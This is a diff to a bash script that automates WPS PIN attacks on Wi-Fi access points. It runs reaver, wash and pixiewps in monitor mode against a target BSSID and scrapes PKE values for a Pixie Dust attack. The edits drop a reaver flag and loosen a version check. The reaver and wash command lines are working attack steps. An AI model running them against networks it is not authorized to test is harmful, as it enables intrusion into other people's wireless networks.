@@ -125,7 +125,7 @@ kill_Hidden() {
 }
 arguments() {
 						   echo "" > ${Temporary}/empty.txt
-                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -vvv -n -L -P -s ${Temporary}/empty.txt > ${Temporary}/Reaver.txt &
+                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -e "$ESSID" -vvv -n -L -s ${Temporary}/empty.txt > ${Temporary}/Reaver.txt &
 						   ReaverID=$!
 						   disown $ReaverID
    						   e=`cat ${Temporary}/Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p 2> /dev/null`
@@ -905,7 +905,7 @@ Installation() {
                 echo ""
 }
 Ver_Pckg_Tools() {
-	             reaver 2&> ${Temporary}/Ver_Reaver.txt 2> /dev/null
+	             reaver 2&> ${Temporary}/Ver_Reaver.txt 2> /dev/null 
                  hash pixiewps 2> /dev/null
                  Ver_Pixiewps="$?"
                  Pixiewps_Version=`pixiewps 2>&1 | grep -w "Pixiewps" | cut -d" " -f3 | tr -d "." 2> /dev/null`
@@ -917,7 +917,7 @@ Ver_Pckg_Tools() {
                  fi
                  hash airmon-ng 2> /dev/null
                  Aircrack_Suite="$?"
-				 Ver_Reaver=`cat ${Temporary}/Ver_Reaver.txt | grep 'mod by t6_x'`
+				 Ver_Reaver=`cat ${Temporary}/Ver_Reaver.txt | grep ''`
                  VerMon=`iwconfig 2>&1 | grep 'Mode:Monitor'`
                  VerCar=`iwconfig 2>&1 | grep 'ESSID' | wc -l`
                  Tools_Folder=`ls -l | grep -E 'Tools$' | grep -E '^d'`
@@ -2191,7 +2191,7 @@ case $menu in
                       then
                            Ver_Mon_Fun
 						   trap kill_wash SIGINT
-						   wash -i $mon -C -o ${Temporary}/wash.txt > /dev/null &
+						   wash -i $mon > ${Temporary}/wash.txt & #> /dev/null &
 						   WashID="$!"
 						   disown $WashID
 						   for ((c=0; c<=3; c++))
@@ -2440,7 +2440,7 @@ case $menu in
 								   sleep 1
 						   done
 						   echo "" > ${Temporary}/empty.txt
-                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -P -s ${Temporary}/empty.txt
+                           reaver -i $mon -b "$BSSID" -c "$CHANNEL" -vvv -n -L -s ${Temporary}/empty.txt
 						   echo ""						   
 					       echo -e -n "$Cyan [+]$Yellow PKE : $Green"
 						   read PKE
